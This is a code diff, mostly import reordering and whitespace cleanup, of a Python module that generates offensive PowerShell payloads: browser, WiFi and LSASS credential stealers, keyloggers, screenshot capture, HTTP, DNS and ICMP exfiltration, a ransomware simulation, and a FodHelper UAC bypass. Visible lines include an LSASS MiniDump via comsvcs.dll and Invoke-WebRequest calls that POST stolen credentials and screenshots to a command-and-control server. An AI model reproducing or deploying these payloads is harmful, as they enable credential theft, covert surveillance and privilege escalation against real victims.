@@ -10,11 +10,10 @@ Advanced payloads for specific purposes
 """
 
 
-
-import os
-import sys
 import base64
+import os
 import random
+import sys
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
@@ -24,7 +23,7 @@ from utils.logger import logger
 class SpecializedPayloads:
     """
     Specialized Payloads for Advanced Operations
-    
+
     Payload Categories:
     - Credential Stealers
     - Keyloggers
@@ -33,16 +32,16 @@ class SpecializedPayloads:
     - Data Exfiltration
     - Privilege Escalation
     """
-    
+
     def __init__(self, c2_server: str = "127.0.0.1", c2_port: int = 4444):
         self.c2_server = c2_server
         self.c2_port = c2_port
-    
+
     # ============ CREDENTIAL STEALERS ============
-    
+
     def generate_credential_stealer(self, target: str = "all") -> str:
         """Generate credential stealing payload"""
-        
+
         if target == "browser":
             return self._browser_credential_stealer()
         elif target == "wifi":
@@ -51,9 +50,9 @@ class SpecializedPayloads:
             return self._lsass_credential_stealer()
         elif target == "all":
             return self._comprehensive_credential_stealer()
-        
+
         return ""
-    
+
     def _browser_credential_stealer(self) -> str:
         """Steal browser credentials"""
         payload = """
@@ -72,7 +71,7 @@ if(Test-Path $firefoxPath){
 }
 """
         return payload.strip()
-    
+
     def _wifi_credential_stealer(self) -> str:
         """Steal WiFi passwords"""
         payload = """
@@ -95,7 +94,7 @@ foreach($profile in $profiles){
 $results | ConvertTo-Json | Out-File "$env:TEMP\\wifi_creds.json"
 """
         return payload.strip()
-    
+
     def _lsass_credential_stealer(self) -> str:
         """Dump LSASS credentials (Mimikatz-style)"""
         payload = """
@@ -109,7 +108,7 @@ rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $proc.Id $dumpFile ful
 # Exfiltrate dump file
 """
         return payload.strip()
-    
+
     def _comprehensive_credential_stealer(self) -> str:
         """Comprehensive credential stealing"""
         payload = f"""
@@ -141,19 +140,19 @@ $json = $output | ConvertTo-Json -Depth 10;
 Invoke-WebRequest -Uri "http://{self.c2_server}:{self.c2_port}/exfil" -Method POST -Body $json;
 """
         return payload.strip()
-    
+
     # ============ KEYLOGGERS ============
-    
+
     def generate_keylogger(self, log_method: str = "file") -> str:
         """Generate keylogger payload"""
-        
+
         if log_method == "file":
             return self._file_keylogger()
         elif log_method == "network":
             return self._network_keylogger()
-        
+
         return ""
-    
+
     def _file_keylogger(self) -> str:
         """File-based keylogger"""
         payload = """
@@ -184,7 +183,7 @@ public class KeyLogger {
 [KeyLogger]::Start();
 """
         return payload.strip()
-    
+
     def _network_keylogger(self) -> str:
         """Network-based keylogger (sends to C2)"""
         payload = f"""
@@ -205,9 +204,9 @@ while($true){{
 }}
 """
         return payload.strip()
-    
+
     # ============ SCREENSHOT CAPTURE ============
-    
+
     def generate_screenshot_payload(self) -> str:
         """Generate screenshot capture payload"""
         payload = f"""
@@ -230,12 +229,12 @@ Invoke-WebRequest -Uri "http://{self.c2_server}:{self.c2_port}/screenshot" -Meth
 Remove-Item $path;
 """
         return payload.strip()
-    
+
     # ============ RANSOMWARE SIMULATION ============
-    
+
     def generate_ransomware_payload(self, simulation: bool = True) -> str:
         """Generate ransomware payload (SIMULATION ONLY)"""
-        
+
         if simulation:
             # Safe simulation - only creates marker files
             payload = """
@@ -266,23 +265,23 @@ No actual encryption has occurred.
 $note | Out-File "$env:USERPROFILE\\Desktop\\RANSOM_NOTE.txt";
 """
             return payload.strip()
-        
+
         return "# Real ransomware disabled for safety"
-    
+
     # ============ DATA EXFILTRATION ============
-    
+
     def generate_exfiltration_payload(self, method: str = "http") -> str:
         """Generate data exfiltration payload"""
-        
+
         if method == "http":
             return self._http_exfiltration()
         elif method == "dns":
             return self._dns_exfiltration()
         elif method == "icmp":
             return self._icmp_exfiltration()
-        
+
         return ""
-    
+
     def _http_exfiltration(self) -> str:
         """HTTP-based exfiltration"""
         payload = f"""
@@ -308,7 +307,7 @@ foreach($pattern in $targetFiles){{
 }}
 """
         return payload.strip()
-    
+
     def _dns_exfiltration(self) -> str:
         """DNS-based exfiltration (covert channel)"""
         payload = f"""
@@ -325,7 +324,7 @@ foreach($chunk in $chunks){{
 }}
 """
         return payload.strip()
-    
+
     def _icmp_exfiltration(self) -> str:
         """ICMP-based exfiltration (covert channel)"""
         payload = f"""
@@ -339,19 +338,19 @@ foreach($byte in $bytes){{
 }}
 """
         return payload.strip()
-    
+
     # ============ PRIVILEGE ESCALATION ============
-    
+
     def generate_privesc_payload(self, method: str = "uac_bypass") -> str:
         """Generate privilege escalation payload"""
-        
+
         if method == "uac_bypass":
             return self._uac_bypass_payload()
         elif method == "token_impersonation":
             return self._token_impersonation_payload()
-        
+
         return ""
-    
+
     def _uac_bypass_payload(self) -> str:
         """UAC bypass payload (FodHelper)"""
         payload = """
@@ -366,7 +365,7 @@ Start-Sleep 3;
 Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force;
 """
         return payload.strip()
-    
+
     def _token_impersonation_payload(self) -> str:
         """Token impersonation payload"""
         payload = """
@@ -385,24 +384,24 @@ $systemProc = Get-Process -Name "winlogon" | Select-Object -First 1;
 if __name__ == "__main__":
     # Test specialized payloads
     payloads = SpecializedPayloads(c2_server="192.168.1.100", c2_port=4444)
-    
-    print("="*60)
+
+    print("=" * 60)
     print("SPECIALIZED PAYLOADS TEST")
-    print("="*60)
-    
+    print("=" * 60)
+
     print("\n1. Browser Credential Stealer:")
     print(payloads.generate_credential_stealer("browser")[:200] + "...")
-    
+
     print("\n2. Keylogger (File-based):")
     print(payloads.generate_keylogger("file")[:200] + "...")
-    
+
     print("\n3. Screenshot Capture:")
     print(payloads.generate_screenshot_payload()[:200] + "...")
-    
+
     print("\n4. Ransomware Simulation:")
     print(payloads.generate_ransomware_payload(simulation=True)[:200] + "...")
-    
+
     print("\n5. HTTP Exfiltration:")
     print(payloads.generate_exfiltration_payload("http")[:200] + "...")
-    
-    print("\n" + "="*60)
+
+    print("\n" + "=" * 60)
